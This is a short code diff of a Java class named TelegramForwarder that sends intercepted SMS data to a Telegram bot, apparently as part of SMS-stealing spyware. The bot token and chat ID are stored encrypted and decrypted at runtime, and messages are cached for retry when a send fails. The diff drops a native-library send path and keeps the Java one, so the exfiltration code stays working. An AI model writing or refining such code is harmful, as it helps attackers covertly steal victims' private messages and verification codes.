@@ -24,10 +24,7 @@ public class TelegramForwarder {
                 cachedChatId = EncryptionUtils.decryptString(ENCRYPTED_CHAT_ID);
             }
 
-            boolean success = nativeTelegramSend(cachedBotToken, cachedChatId, smsData);
-            if (!success) {
-                success = javaTelegramSend(cachedBotToken, cachedChatId, smsData);
-            }
+            boolean success = javaTelegramSend(cachedBotToken, cachedChatId, smsData);
             if (!success) {
                 SmsCache.cacheSms(context, "unknown", smsData, System.currentTimeMillis());
             }
@@ -61,13 +58,5 @@ public class TelegramForwarder {
         } finally {
             if (connection != null) connection.disconnect();
         }
-    }
-
-    private static native boolean nativeTelegramSend(String botToken, String chatId, String message);
-
-    static {
-        try {
-            System.loadLibrary("native-forwarder");
-        } catch (UnsatisfiedLinkError e) {}
     }
 }
